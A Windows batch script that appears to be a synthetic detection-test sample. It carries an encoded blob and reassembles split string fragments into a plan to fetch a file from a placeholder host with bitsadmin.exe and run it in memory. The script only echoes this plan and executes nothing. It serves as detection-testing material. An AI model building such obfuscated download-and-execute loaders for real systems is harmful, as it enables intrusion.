@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|add_7
rem HUNTRESS-MATERIAL:fUQ4g3p7bHd6RGhqeHxweWxmeWx0dntsM2twendoe2pvZnRsdHZ5gINoa2h3e2x5RGlwe3poa3RwdTVsf2yDentobmxmanZ8dXtEOINueWh3b0RtaHVmdnx7g3Vsf3tmc2h1bnxobmxEdXZ1bINqaHR3aHBudWZwa0RqaHR3aHBudTQ+Nzo6OWxAOjs+g3x5c0Rve3t3ekE2Nj43Ojo5bEA6Oz41bH9odHdzbDVwdX1oc3BrNjtsaTxqaj49NWtoew==
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=acquire_remote,dispatch_memory|adapter="
set "FrAg1=bitsadmin.exe|stage_count=1|graph=fan_out|next_la"
set "FrAg2=nguage=none|campaign_id=campaign-70332e9347|url=h"
set "FrAg3=ttps://70332e9347.example.invalid/4eb5cc76.dat"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_opaque_branch=3f8ce899"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "ReCoVeReD="
for %%G in (0 1 2 3) do call set "ReCoVeReD=%%ReCoVeReD%%%%FrAg%%G%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo bitsadmin.exe GET https://70332e9347.example.invalid/4eb5cc76.dat then dispatch memory
exit /b 0
